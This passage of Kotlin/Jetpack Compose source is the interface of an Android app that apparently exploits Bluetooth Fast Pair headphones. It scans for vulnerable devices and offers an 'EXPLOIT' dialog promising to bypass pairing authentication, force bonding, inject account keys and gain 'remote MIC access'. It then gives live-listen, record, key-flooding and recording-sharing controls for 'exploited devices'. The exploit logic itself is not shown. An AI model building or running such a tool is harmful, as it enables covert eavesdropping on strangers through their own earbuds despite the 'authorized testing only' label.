    LaunchedEffect(Unit) {
        onCheckConnections()
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(paddingValues)
            .padding(horizontal = 16.dp)
    ) {
        Spacer(Modifier.height(12.dp))

        Row(
            modifier = Modifier.fillMaxWidth(),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(Icons.Default.Headphones, null, tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(28.dp))
            Spacer(Modifier.width(12.dp))
            Column {
                Text("Paired Devices", fontWeight = FontWeight.Bold, fontSize = 20.sp, color = MaterialTheme.colorScheme.onBackground)
                Text("Manage exploited devices", fontSize = 12.sp, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f))
            }
        }

        Spacer(Modifier.height(16.dp))

        if (devices.isEmpty()) {
            Box(
                modifier = Modifier.fillMaxSize(),
                contentAlignment = Alignment.Center
            ) {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
                    shape = RoundedCornerShape(16.dp)
                ) {
                    Column(
                        modifier = Modifier.padding(24.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Icon(
                            Icons.Default.BluetoothDisabled,
                            null,
                            tint = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f),
                            modifier = Modifier.size(64.dp)
                        )
                        Spacer(Modifier.height(16.dp))
                        Text(
                            "No Paired Devices",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.SemiBold,
                            color = MaterialTheme.colorScheme.onBackground
                        )
                        Spacer(Modifier.height(8.dp))
                        Text(
                            "Devices you successfully pair using the 'Exploit' action will appear here.",
                            style = MaterialTheme.typography.bodyMedium,
                            color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f),
                            textAlign = TextAlign.Center
                        )
                        Spacer(Modifier.height(16.dp))
                        Text(
                            "Go to Scanner tab → Find a vulnerable device → Tap 'Exploit'",
                            style = MaterialTheme.typography.labelMedium,
                            color = MaterialTheme.colorScheme.primary,
                            textAlign = TextAlign.Center
                        )
                    }
                }
            }
        } else {
            LazyColumn(
                verticalArrangement = Arrangement.spacedBy(12.dp),
                modifier = Modifier.weight(1f)
            ) {
                items(devices) { device ->
                    PairedDeviceCard(
                        context = context,
                        device = device,
                        audioState = audioStates[device.address],
                        exploitResult = exploitResults[device.address],
                        onConnectHfp = { onConnectHfp(device) },
                        onStartRecording = { onStartRecording(device) },
                        onStopRecording = { onStopRecording(device) },
                        onStartListening = { onStartListening(device) },
                        onStopListening = { onStopListening(device) },
                        onWriteAccountKey = { onWriteAccountKey(device) },
                        onFloodKeys = { onFloodKeys(device) }
                    )
                }
                item { Spacer(Modifier.height(8.dp)) }
            }
        }
    }
}

@Composable
fun PairedDeviceCard(
    context: Context,
    device: FastPairDevice,
    audioState: WsprActivity.AudioConnectionState?,
    exploitResult: String?,
    onConnectHfp: () -> Unit,
    onStartRecording: () -> Unit,
    onStopRecording: () -> Unit,
    onStartListening: () -> Unit,
    onStopListening: () -> Unit,
    onWriteAccountKey: () -> Unit,
    onFloodKeys: () -> Unit
) {
    val isHfpConnected = audioState?.isConnected == true
    val isRecording = audioState?.isRecording == true
    val isListening = audioState?.isListening == true

    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
        shape = RoundedCornerShape(16.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            // Device header
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                    Box(
                        modifier = Modifier
                            .size(48.dp)
                            .clip(CircleShape)
                            .background(if (isHfpConnected) MaterialTheme.colorScheme.primary.copy(alpha = 0.2f) else MaterialTheme.colorScheme.primary.copy(alpha = 0.15f)),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            Icons.Default.Headphones,
                            null,
                            tint = MaterialTheme.colorScheme.primary,
                            modifier = Modifier.size(26.dp)
                        )
                    }
                    Spacer(Modifier.width(12.dp))
                    Column {
                        Text(
                            device.displayName,
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.SemiBold,
                            color = MaterialTheme.colorScheme.onBackground,
                            maxLines = 1,
                            overflow = TextOverflow.Ellipsis
                        )
                        device.manufacturer?.let {
                            Text(it, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f))
                        }
                        Text(
                            device.address,
                            style = MaterialTheme.typography.labelSmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f),
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }
                Surface(
                    color = if (isHfpConnected) MaterialTheme.colorScheme.primary.copy(alpha = 0.2f) else MaterialTheme.colorScheme.error.copy(alpha = 0.2f),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Text(
                        if (isHfpConnected) "Connected" else "Disconnected",
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
                        style = MaterialTheme.typography.labelSmall,
                        fontWeight = FontWeight.SemiBold,
                        color = if (isHfpConnected) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.error
                    )
                }
            }

            Spacer(Modifier.height(16.dp))

            // Status message
            audioState?.message?.let { message ->
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(8.dp))
                        .background(MaterialTheme.colorScheme.surfaceVariant)
                        .padding(10.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(
                        when {
                            isRecording -> Icons.Default.FiberManualRecord
                            isListening -> Icons.Default.Hearing
                            isHfpConnected -> Icons.Default.CheckCircle
                            else -> Icons.Default.Info
                        },
                        null,
                        tint = when {
                            isRecording -> MaterialTheme.colorScheme.error
                            isListening -> MaterialTheme.colorScheme.primary
                            isHfpConnected -> MaterialTheme.colorScheme.primary
                            else -> MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)
                        },
                        modifier = Modifier.size(16.dp)
                    )
                    Spacer(Modifier.width(8.dp))
                    Text(
                        message,
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onBackground
                    )
                }
                Spacer(Modifier.height(12.dp))
            }

            if (isHfpConnected) {
                // Audio Controls
                Text("AUDIO CONTROLS", style = MaterialTheme.typography.labelMedium, color = MaterialTheme.colorScheme.secondary)
                Spacer(Modifier.height(8.dp))
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    // Live Listen Button
                    Button(
                        onClick = { if (isListening) onStopListening() else onStartListening() },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isListening) MaterialTheme.colorScheme.error else MaterialTheme.colorScheme.secondary,
                            contentColor = MaterialTheme.colorScheme.onSecondary
                        ),
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(
                            if (isListening) Icons.Default.Stop else Icons.Default.Hearing,
                            null,
                            Modifier.size(18.dp)
                        )
                        Spacer(Modifier.width(6.dp))
                        Text(if (isListening) "STOP LIVE" else "LIVE LISTEN", fontWeight = FontWeight.Bold)
                    }

                    // Record Button
                    Button(
                        onClick = { if (isRecording) onStopRecording() else onStartRecording() },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isRecording) MaterialTheme.colorScheme.error else MaterialTheme.colorScheme.surfaceVariant,
                            contentColor = if (isRecording) MaterialTheme.colorScheme.onError else MaterialTheme.colorScheme.primary
                        ),
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(
                            if (isRecording) Icons.Default.Stop else Icons.Default.FiberManualRecord,
                            null,
                            tint = if (isRecording) MaterialTheme.colorScheme.onError else MaterialTheme.colorScheme.error,
                            modifier = Modifier.size(18.dp)
                        )
                        Spacer(Modifier.width(6.dp))
                        Text(
                            if (isRecording) "STOP REC" else "RECORD",
                            fontWeight = FontWeight.Bold
                        )
                    }
                }

                Spacer(Modifier.height(12.dp))

                // Account Key Operations
                Text("ACCOUNT KEY OPERATIONS", style = MaterialTheme.typography.labelMedium, color = MaterialTheme.colorScheme.secondary)
                Spacer(Modifier.height(8.dp))

                // Key operation result/progress display
                exploitResult?.let { result ->
                    val bgColor = when {
                        result.startsWith("KEY") || result.startsWith("FLOOD") -> MaterialTheme.colorScheme.primary
                        result.startsWith("FAILED") -> MaterialTheme.colorScheme.error
                        else -> MaterialTheme.colorScheme.primary
                    }
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(8.dp))
                            .background(bgColor.copy(alpha = 0.15f))
                            .padding(10.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(
                            when {
                                result.startsWith("KEY") || result.startsWith("FLOOD") -> Icons.Default.CheckCircle
                                result.startsWith("FAILED") -> Icons.Default.Error
                                else -> Icons.Default.Sync
                            },
                            null,
                            tint = bgColor,
                            modifier = Modifier.size(16.dp)
                        )
                        Spacer(Modifier.width(8.dp))
                        Text(
                            result,
                            style = MaterialTheme.typography.labelSmall,
                            color = MaterialTheme.colorScheme.onBackground,
                            maxLines = 2,
                            overflow = TextOverflow.Ellipsis
                        )
                    }
                    Spacer(Modifier.height(8.dp))
                }

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    OutlinedButton(
                        onClick = onWriteAccountKey,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = MaterialTheme.colorScheme.primary)
                    ) {
                        Icon(Icons.Default.Key, null, Modifier.size(16.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Write Key", fontSize = 12.sp)
                    }
                    OutlinedButton(
                        onClick = onFloodKeys,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = MaterialTheme.colorScheme.error)
                    ) {
                        Icon(Icons.Default.FlashOn, null, Modifier.size(16.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Flood Keys", fontSize = 12.sp)
                    }
                }
            } else {
                // Not connected - show connect buttons only
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Button(
                        onClick = onConnectHfp,
                        modifier = Modifier.weight(1f),
                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Icon(Icons.Default.BluetoothConnected, null, Modifier.size(18.dp))
                        Spacer(Modifier.width(6.dp))
                        Text("Connect Audio")
                    }
                    OutlinedButton(
                        onClick = {
                            context.startActivity(Intent(Settings.ACTION_BLUETOOTH_SETTINGS))
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f))
                    ) {
                        Icon(Icons.Default.Settings, null, Modifier.size(18.dp))
                        Spacer(Modifier.width(6.dp))
                        Text("Settings")
                    }
                }
            }
        }
    }
}

@Composable
fun RecordingsScreen(recordingsDir: File, paddingValues: PaddingValues) {
    val context = LocalContext.current
    var recordings by remember { mutableStateOf(listOf<File>()) }
    var playingFile by remember { mutableStateOf<String?>(null) }
    var audioTrack by remember { mutableStateOf<AudioTrack?>(null) }
    var mediaPlayer by remember { mutableStateOf<MediaPlayer?>(null) }

    LaunchedEffect(Unit) {
        recordings = recordingsDir.listFiles()?.filter {
            it.name.startsWith("whisper_") && (it.name.endsWith(".pcm") || it.name.endsWith(".m4a"))
        }?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    fun refreshRecordings() {
        recordings = recordingsDir.listFiles()?.filter {
            it.name.startsWith("whisper_") && (it.name.endsWith(".pcm") || it.name.endsWith(".m4a"))
        }?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    fun stopPlaying() {
        playingFile = null
        audioTrack?.stop()
        audioTrack?.release()
        audioTrack = null
        mediaPlayer?.stop()
        mediaPlayer?.release()
        mediaPlayer = null
    }

    fun playFile(file: File) {
        stopPlaying()
        playingFile = file.absolutePath

        if (file.name.endsWith(".m4a")) {
            // Use MediaPlayer for M4A files
            try {
                val player = MediaPlayer().apply {
                    setDataSource(file.absolutePath)
                    setOnCompletionListener {
                        playingFile = null
                        release()
                        mediaPlayer = null
                    }
                    setOnErrorListener { _, _, _ ->
                        playingFile = null
                        release()
                        mediaPlayer = null
                        true
                    }
                    prepare()
                    start()
                }
                mediaPlayer = player
            } catch (e: Exception) {
                playingFile = null
            }
        } else {
            // Use AudioTrack for raw PCM files
            thread {
                try {
                    val bufferSize = AudioTrack.getMinBufferSize(16000, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT)
                    val track = AudioTrack.Builder()
                        .setAudioAttributes(AudioAttributes.Builder().setUsage(AudioAttributes.USAGE_MEDIA).setContentType(AudioAttributes.CONTENT_TYPE_SPEECH).build())
                        .setAudioFormat(AudioFormat.Builder().setEncoding(AudioFormat.ENCODING_PCM_16BIT).setSampleRate(16000).setChannelMask(AudioFormat.CHANNEL_OUT_MONO).build())
                        .setBufferSizeInBytes(bufferSize)
                        .setTransferMode(AudioTrack.MODE_STREAM)
                        .build()
                    audioTrack = track
                    track.play()

                    FileInputStream(file).use { fis ->
                        val buffer = ByteArray(bufferSize)
                        var bytesRead: Int
                        while (fis.read(buffer).also { bytesRead = it } != -1 && playingFile == file.absolutePath) {
                            track.write(buffer, 0, bytesRead)
                        }
                    }
                    track.stop()
                    track.release()
                    playingFile = null
                } catch (e: Exception) {
                    playingFile = null
                }
            }
        }
    }

    fun shareFile(file: File) {
        val uri = FileProvider.getUriForFile(context, "${context.packageName}.provider", file)
        val intent = Intent(Intent.ACTION_SEND).apply {
            type = "audio/*"
            putExtra(Intent.EXTRA_STREAM, uri)
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        context.startActivity(Intent.createChooser(intent, "Share recording"))
    }

    fun deleteFile(file: File) {
        stopPlaying()
        file.delete()
        refreshRecordings()
    }

    Column(modifier = Modifier.fillMaxSize().padding(paddingValues).padding(horizontal = 16.dp)) {
        if (recordings.isEmpty()) {
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .border(1.dp, MaterialTheme.colorScheme.secondary.copy(alpha = 0.3f), RoundedCornerShape(16.dp)),
                colors = CardDefaults.cardColors(containerColor = Color.Transparent),
                shape = RoundedCornerShape(16.dp)
            ) {
                Column(modifier = Modifier.fillMaxWidth().padding(32.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(Icons.Default.AudioFile, null, tint = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f), modifier = Modifier.size(64.dp))
                    Spacer(Modifier.height(16.dp))
                    Text("No recordings yet", style = MaterialTheme.typography.titleMedium, color = MaterialTheme.colorScheme.onSurface)
                    Text("Use the Scanner tab to record audio from exploited devices", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f), textAlign = TextAlign.Center)
                }
            }
        } else {
            LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                items(recordings) { file ->
                    val isPlaying = playingFile == file.absolutePath
                    val dateFormat = SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.US)
                    val date = dateFormat.format(Date(file.lastModified()))
                    val sizeKb = file.length() / 1024

                    Card(
                        modifier = Modifier
                            .fillMaxWidth()
                            .border(1.dp, MaterialTheme.colorScheme.secondary.copy(alpha = 0.3f), RoundedCornerShape(12.dp)),
                        colors = CardDefaults.cardColors(containerColor = Color.Transparent),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Row(modifier = Modifier.fillMaxWidth().padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                            Box(
                                modifier = Modifier.size(48.dp).clip(CircleShape).background(if (isPlaying) PatchedGreen.copy(alpha = 0.2f) else MaterialTheme.colorScheme.primary.copy(alpha = 0.15f)),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(if (isPlaying) Icons.Default.GraphicEq else Icons.Default.AudioFile, null, tint = if (isPlaying) PatchedGreen else MaterialTheme.colorScheme.primary, modifier = Modifier.size(24.dp))
                            }
                            Spacer(Modifier.width(12.dp))
                            Column(modifier = Modifier.weight(1f)) {
                                Text(file.name, style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.Medium, color = MaterialTheme.colorScheme.onSurface, maxLines = 1, overflow = TextOverflow.Ellipsis)
                                Text("$date • ${sizeKb}KB", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f))
                            }
                            IconButton(onClick = { if (isPlaying) stopPlaying() else playFile(file) }) {
                                Icon(if (isPlaying) Icons.Default.Stop else Icons.Default.PlayArrow, null, tint = if (isPlaying) MaterialTheme.colorScheme.error else MaterialTheme.colorScheme.primary)
                            }
                            IconButton(onClick = { shareFile(file) }) {
                                Icon(Icons.Default.Share, "Share", tint = MaterialTheme.colorScheme.primary)
                            }
                            IconButton(onClick = { deleteFile(file) }) {
                                Icon(Icons.Default.Delete, "Delete", tint = MaterialTheme.colorScheme.error)
                            }
                        }
                    }
                }
                item { Spacer(Modifier.height(8.dp)) }
            }
        }
    }
}

@Composable
fun ScanControlCard(isScanning: Boolean, deviceCount: Int, onToggleScan: () -> Unit) {
    val infiniteTransition = rememberInfiniteTransition(label = "scan")
    val pulse by infiniteTransition.animateFloat(1f, 1.2f, infiniteRepeatable(tween(1000), RepeatMode.Reverse), label = "pulse")

    Card(
        modifier = Modifier
            .fillMaxWidth()
            .border(1.dp, MaterialTheme.colorScheme.secondary.copy(alpha = 0.4f), RoundedCornerShape(16.dp)),
        colors = CardDefaults.cardColors(containerColor = Color.Transparent),
        shape = RoundedCornerShape(16.dp)
    ) {
        Row(modifier = Modifier.fillMaxWidth().padding(16.dp), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(12.dp)) {
            Column(modifier = Modifier.weight(1f)) {
                Text(if (isScanning) "Scanning" else "Initiate Scan", style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.SemiBold, color = MaterialTheme.colorScheme.onBackground, maxLines = 1)
                Text(if (isScanning) "Detector is up and running" else "Press Scan to detect nearby devices", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f), maxLines = 1)
            }
            Button(
                onClick = onToggleScan,
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (isScanning) MaterialTheme.colorScheme.secondary else MaterialTheme.colorScheme.primary,
                    contentColor = if (isScanning) MaterialTheme.colorScheme.onSecondary else MaterialTheme.colorScheme.onPrimary
                ),
                shape = RoundedCornerShape(12.dp),
                modifier = if (isScanning) Modifier.scale(pulse) else Modifier
            ) {
                Icon(if (isScanning) Icons.Default.Stop else Icons.Default.PlayArrow, null, Modifier.size(20.dp))
                Spacer(Modifier.width(4.dp))
                Text(if (isScanning) "Stop" else "Scan")
            }
        }
    }
}

@Composable
fun DeviceCard(
    device: FastPairDevice,
    exploitResult: String?,
    onTest: () -> Unit,
    onExploit: () -> Unit
) {
    val statusColor by animateColorAsState(
        when (device.status) {
            DeviceStatus.VULNERABLE -> MaterialTheme.colorScheme.error
            DeviceStatus.PATCHED -> MaterialTheme.colorScheme.primary
            DeviceStatus.TESTING -> MaterialTheme.colorScheme.secondary
            DeviceStatus.ERROR -> MaterialTheme.colorScheme.error
            DeviceStatus.NOT_TESTED -> MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)
        }, label = "statusColor"
    )

    var showMagicDialog by remember { mutableStateOf(false) }

    Card(
        modifier = Modifier
            .fillMaxWidth()
            .border(
                width = 1.dp,
                color = if (device.status == DeviceStatus.VULNERABLE) 
                    MaterialTheme.colorScheme.error.copy(alpha = 0.6f) 
                else 
                    MaterialTheme.colorScheme.secondary.copy(alpha = 0.3f),
                shape = RoundedCornerShape(12.dp)
            ),
        colors = CardDefaults.cardColors(containerColor = Color.Transparent),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.Top) {
                Row(modifier = Modifier.weight(1f), verticalAlignment = Alignment.CenterVertically) {
                    Box(modifier = Modifier.size(44.dp).clip(CircleShape).background(statusColor.copy(alpha = 0.15f)), contentAlignment = Alignment.Center) {
                        Icon(if (device.isFastPair) Icons.Default.Headphones else Icons.Default.Bluetooth, null, tint = statusColor, modifier = Modifier.size(24.dp))
                    }
                    Spacer(Modifier.width(12.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text(device.displayName, style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.onBackground, maxLines = 1, overflow = TextOverflow.Ellipsis)
                        device.manufacturer?.let { Text(it, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)) }
                        Text(device.address, style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f), fontFamily = FontFamily.Monospace)
                    }
                }
                StatusBadge(device.status)
            }

            Spacer(Modifier.height(12.dp))

            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    InfoChip(when (device.signalStrength) { SignalStrength.EXCELLENT, SignalStrength.GOOD -> Icons.Default.NetworkWifi; SignalStrength.FAIR -> Icons.Default.Wifi; else -> Icons.Default.WifiOff }, "${device.rssi} dBm", when (device.signalStrength) { SignalStrength.EXCELLENT, SignalStrength.GOOD -> MaterialTheme.colorScheme.primary; SignalStrength.FAIR -> MaterialTheme.colorScheme.secondary; else -> MaterialTheme.colorScheme.error })
                    if (device.isFastPair) {
                        InfoChip(
                            icon = if (device.isPairingMode) Icons.Default.Link else Icons.Default.LinkOff,
                            text = if (device.isPairingMode) "Pairing" else "Not Pairing",
                            color = if (device.isPairingMode) MaterialTheme.colorScheme.secondary else MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)
                        )
                    } else {
                        InfoChip(Icons.Default.Bluetooth, "BLE", MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f))
                    }
                }
                Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                    if (!device.isPairingMode && device.status != DeviceStatus.TESTING && (device.status == DeviceStatus.NOT_TESTED || device.status == DeviceStatus.ERROR)) {
                        FilledTonalButton(
                            onClick = onTest,
                            colors = ButtonDefaults.filledTonalButtonColors(
                                containerColor = MaterialTheme.colorScheme.primary.copy(alpha = 0.2f),
                                contentColor = MaterialTheme.colorScheme.primary
                            ),
                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp),
                            modifier = Modifier.height(32.dp)
                        ) {
                            Icon(Icons.Default.PlayArrow, null, Modifier.size(16.dp))
                            Spacer(Modifier.width(4.dp))
                            Text("Test", fontSize = 12.sp)
                        }
                    }
                    if (device.status == DeviceStatus.TESTING) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = MaterialTheme.colorScheme.secondary)
                            Spacer(Modifier.width(8.dp))
                            Text("Testing...", fontSize = 12.sp, color = MaterialTheme.colorScheme.secondary)
                        }
                    }
                }
            }

            if (device.isPairingMode) {
                Spacer(Modifier.height(8.dp))
                Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(MaterialTheme.colorScheme.secondary.copy(alpha = 0.1f)).padding(8.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Info, null, tint = MaterialTheme.colorScheme.secondary, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("Device in pairing mode - test not applicable", style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.secondary)
                }
            }

            // Exploit progress display (shown for all devices during/after quick exploit)
            exploitResult?.let { result ->
                Spacer(Modifier.height(8.dp))
                val bgColor = when { result.startsWith("PAIRED") || result.startsWith("KEY") -> MaterialTheme.colorScheme.primary; result.startsWith("PARTIAL") -> WarningOrange; result.startsWith("FAILED") -> MaterialTheme.colorScheme.error; else -> MaterialTheme.colorScheme.primary }
                Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(bgColor.copy(alpha = 0.15f)).padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(when { result.startsWith("PAIRED") || result.startsWith("KEY") -> Icons.Default.CheckCircle; result.startsWith("PARTIAL") -> Icons.Default.Warning; result.startsWith("FAILED") -> Icons.Default.Error; else -> Icons.Default.Sync }, null, tint = bgColor, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(8.dp))
                    Text(result, style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onBackground, maxLines = 2, overflow = TextOverflow.Ellipsis)
                }
            }

            // Vulnerable device controls
            if (device.status == DeviceStatus.VULNERABLE) {
                Spacer(Modifier.height(12.dp))

                val isOperating = exploitResult?.let { it.startsWith("Connecting") || it.startsWith("Writing") || it.startsWith("Flooding") } == true

                // Exploit button
                Button(onClick = { showMagicDialog = true }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary, contentColor = MaterialTheme.colorScheme.onSecondary), enabled = !isOperating) {
                    Icon(Icons.Default.Terminal, null, Modifier.size(18.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("EXPLOIT", fontWeight = FontWeight.Bold)
                }
            }
        }

        if (showMagicDialog) {
            AlertDialog(
                onDismissRequest = { showMagicDialog = false },
                icon = { Icon(Icons.Default.Terminal, null, tint = MaterialTheme.colorScheme.secondary, modifier = Modifier.size(48.dp)) },
                title = { Text("INITIATE EXPLOIT?", fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.secondary) },
                text = {
                    Column {
                        Text("Target acquisition in progress. Attempting to:", color = MaterialTheme.colorScheme.primary)
                        Spacer(Modifier.height(8.dp))
                        BulletPoint("Bypass Fast Pair Auth")
                        BulletPoint("Extract BR/EDR Address")
                        BulletPoint("Force Bluetooth Bonding")
                        BulletPoint("Inject Account Key")
                        Spacer(Modifier.height(12.dp))
                        Text("Success allows remote MIC access.", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.primary)
                        Spacer(Modifier.height(8.dp))
                        Text("AUTHORIZED TESTING ONLY!", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.secondary, fontWeight = FontWeight.SemiBold)
                    }
                },
                confirmButton = { Button(onClick = { showMagicDialog = false; onExploit() }, colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary, contentColor = MaterialTheme.colorScheme.onSecondary)) { Text("EXPLOIT") } },
                dismissButton = { TextButton(onClick = { showMagicDialog = false }) { Text("ABORT", color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)) } },
                containerColor = MaterialTheme.colorScheme.surface
            )
        }
    }
}

@Composable
fun InfoChip(icon: ImageVector, text: String, color: Color) {
    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.clip(RoundedCornerShape(4.dp)).background(color.copy(alpha = 0.1f)).padding(horizontal = 6.dp, vertical = 2.dp)) {
        Icon(icon, null, tint = color, modifier = Modifier.size(12.dp))
        Spacer(Modifier.width(4.dp))
        Text(text, style = MaterialTheme.typography.labelSmall, color = color)
    }
}

@Composable
fun StatusBadge(status: DeviceStatus) {
    val infiniteTransition = rememberInfiniteTransition(label = "status")
    val alpha by infiniteTransition.animateFloat(0.7f, 1f, infiniteRepeatable(tween(500), RepeatMode.Reverse), label = "alpha")
    val (text, color, icon) = when (status) {
        DeviceStatus.NOT_TESTED -> Triple("Not Tested", MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f), Icons.Outlined.HelpOutline)
        DeviceStatus.TESTING -> Triple("Testing", MaterialTheme.colorScheme.secondary, Icons.Default.Sync)
        DeviceStatus.VULNERABLE -> Triple("VULNERABLE", MaterialTheme.colorScheme.error, Icons.Default.Warning)
        DeviceStatus.PATCHED -> Triple("Patched", MaterialTheme.colorScheme.primary, Icons.Default.CheckCircle)
        DeviceStatus.ERROR -> Triple("Error", MaterialTheme.colorScheme.error, Icons.Default.Error)
    }
    Surface(color = color.copy(alpha = if (status == DeviceStatus.VULNERABLE) alpha * 0.2f else 0.15f), shape = RoundedCornerShape(8.dp)) {
        Row(modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
            Icon(icon, null, tint = if (status == DeviceStatus.VULNERABLE) color.copy(alpha = alpha) else color, modifier = Modifier.size(14.dp))
            Spacer(Modifier.width(4.dp))
            Text(text, color = if (status == DeviceStatus.VULNERABLE) color.copy(alpha = alpha) else color, style = MaterialTheme.typography.labelSmall, fontWeight = FontWeight.SemiBold)
        }
    }
}

@Composable
fun EmptyStateCard(isScanning: Boolean) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
